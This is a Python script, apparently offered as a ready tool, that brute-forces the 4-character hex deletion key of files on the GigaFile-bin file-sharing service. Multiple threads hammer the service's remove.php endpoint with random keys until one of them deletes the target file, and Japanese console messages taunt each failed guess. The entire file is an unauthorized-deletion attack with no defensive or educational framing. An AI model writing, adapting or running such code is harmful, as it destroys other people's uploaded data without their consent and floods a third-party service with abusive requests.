import json
import random
import threading
import time
import urllib.parse
import urllib.request


def main():
    url = input("ギガファイル便のURLを入力してください: ")
    file_name = url.split("/")[-1]
    server_id = url.split("/")[2]

    thread_num = int(input("スレッド数を入力してください: "))

    random.seed(time.time_ns())
    used_passwords = set()

    while True:
        password = generate_random_string(4)
        if password not in used_passwords:
            used_passwords.add(password)
            break

    delete_url = f"https://{server_id}/remove.php?file={file_name}&delkey={password}"

    threads = []
    for i in range(thread_num):
        t = threading.Thread(target=delete_file, args=(delete_url,file_name))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()


def delete_file(delete_url, file_name):
    while True:
        try:
            response = urllib.request.urlopen(delete_url)
            result = json.loads(response.read())
        except Exception as e:
            print(e)
            print("エラーが発生しました。店員を呼んでいますので少々お待ちください")
            time.sleep(5)
            continue

        if result["status"] == 0:
            print("削除に成功しました")
            break
        else:
            password = generate_random_string(4)
            delete_url = f"{delete_url.split('&')[0]}&delkey={password}"
            print(f"パスワード{password}は違ったようだなガハハハッ")


def generate_random_string(length):
    char_set = "abcdef1234567890"
    return ''.join(random.choice(char_set) for _ in range(length))


if __name__ == "__main__":
    main()
